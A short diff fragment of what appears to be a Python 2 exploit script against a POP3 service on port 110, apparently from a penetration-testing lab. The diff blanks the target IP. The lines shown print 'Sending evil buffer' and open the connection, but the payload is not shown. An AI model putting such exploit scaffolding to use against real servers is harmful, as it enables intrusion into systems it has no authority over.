@@ -7,7 +7,7 @@ buffer = ""
 
 try:
     print "\nSending evil buffer..."
-    s.connect(('10.11.12.153',110))
+    s.connect(('',110))
     data = s.recv(1024)
     s.send('USER username' +'\r\n')
     data = s.recv(1024)
